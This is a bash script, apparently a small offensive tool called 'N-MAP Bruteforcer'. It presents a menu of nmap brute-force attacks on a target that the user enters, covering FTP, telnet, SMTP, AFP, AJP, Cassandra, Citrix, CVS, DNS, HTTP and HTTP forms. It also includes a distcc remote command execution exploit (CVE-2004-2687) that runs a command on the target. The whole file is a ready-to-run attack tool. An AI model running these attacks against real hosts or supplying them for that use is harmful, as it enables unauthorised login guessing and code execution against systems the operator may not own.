#!bin/bash
clear
cat << !
  \  |        \  |    \     _ \   __ )             |        ____|                       
   \ |       |\/ |   _ \   |   |  __ \   __| |   | __|  _ \ |    _ \   __| __|  _ \  __|
 |\  |_____| |   |  ___ \  ___/   |   | |    |   | |    __/ __| (   | |   (     __/ |   
_| \_|      _|  _|_/    _\_|     ____/ _|   \__,_|\__|\___|_|  \___/ _|  \___|\___|_|   V. - 0.1
										
										Developed By :
										@Harshil Patel & @Ashish Kunwar aka dorkerdevil
!
# Looking For root
root="0"
	if 
		[ "$(id -u)" -ne "$root" ];
	then
		echo ""
		echo "\033[1;34m[!]\033[0m Sorry, This Script Must Be Execute With \033[1;31mroot\033[0m Privileges"
		echo ""
    exit 1
fi

echo "\n\n1\033[1;31m)\033[1;m \033[1;33mFTP\033[1;m , 2\033[1;31m)\033[1;m \033[1;33mAFP\033[1;m , 3\033[1;31m)\033[1;m \033[1;33mtelnet\033[1;m , 4\033[1;31m)\033[1;m \033[1;33mSMTP\033[1;m , 5\033[1;31m)\033[1;m \033[1;33mAJP\033[1;m , 6\033[1;31m)\033[1;m \033[1;33mCassandra\033[1;m , 7\033[1;31m)\033[1;m \033[1;33mCitrix\033[1;m\n
8\033[1;31m)\033[1;m \033[1;33mCVS\033[1;m , 9\033[1;31m)\033[1;m \033[1;33mdistcc-cve2004-2687\033[1;m , 10\033[1;31m)\033[1;m \033[1;33mDNS\033[1;m , 11\033[1;31m)\033[1;m \033[1;33mHTTP\033[1;m , 12\033[1;31m)\033[1;m \033[1;33mHTTP-Form\033[1;m \n"

echo -n "\033[1;36m Enter Your Choice : \033[1;m"
read choice

case $choice in
	1)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 21 --script ftp-brute $target -d
	;;
	2)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 548 --script afp-bruteforce $target
	;;
	3)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 23 --script telnet-brute $target -d
	;;
	4)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 25 --script smtp-brute $target -d
	;;
	5)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 8009 $target --script ajp-brute
	;;
	6)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 9160 $target --script=cassandra-brute
	;;
	7)
		echo -n " \033[1;36m Enter UserList File (userdb) : \033[1;m"
		read userdb
		echo -n " \033[1;36m Enter PasswordList File (passdb) : \033[1;m"
		read passdb
		echo -n " \033[1;36m Enter Domain Name (ntdomain) : \033[1;m"
		read ntdomain
		echo -n " \033[1;36m Enter Host Name : \033[1;m"
		read host
		nmap --script=citrix-brute-xml --scriptargs=userdb=$userdb,passdb=$passdb,ntdomain=$ntdomain -p 80,443,8080 $host
	;;
	8)
		echo -n "\033[1;36m Enter Host : \033[1;m"
		read host
		nmap -p 2401 --script cvs-brute $host
	;;
	9)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap -p 3632 $target --script distcc-exec --script-args="distcc-exec.cmd='id'"
	;;
	10)
		echo -n "\033[1;36m Enter Your Target : \033[1;m"
		read target
		nmap --script dns-brute $target
	;;
	11)
		echo -n "\033[1;36m Enter Host : \033[1;m"
		read host
		nmap --script http-brute -p 80 $host
	;;
	12)
		echo -n "\033[1;36m Enter Host : \033[1;m"
		read host
		nmap --script http-form-brute -p 80 $host
	;;
	*)
		echo "Please Select Right Option"
esac 
